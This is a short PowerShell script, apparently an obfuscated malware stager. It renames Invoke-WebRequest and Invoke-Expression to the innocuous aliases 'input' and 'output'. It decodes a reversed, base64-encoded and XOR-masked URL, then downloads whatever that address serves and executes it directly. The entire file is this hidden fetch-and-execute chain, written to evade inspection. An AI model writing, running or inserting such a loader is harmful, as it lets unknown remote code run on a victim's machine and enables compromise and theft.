Set-Alias -name input -val Invoke-WebRequest
Set-Alias -name output -val Invoke-Expression

$a = "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray()
[aRRaY]::reVErse($a)
$b = [sYstEM.CoNveRt]::froMbasE64strING($a -join"")

for ($x = 0; $x -lt $b.Count; $x++) {
    ${B}[${x}] = ${B}[${X}] -bxor 37
}

$c = (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content
output $c
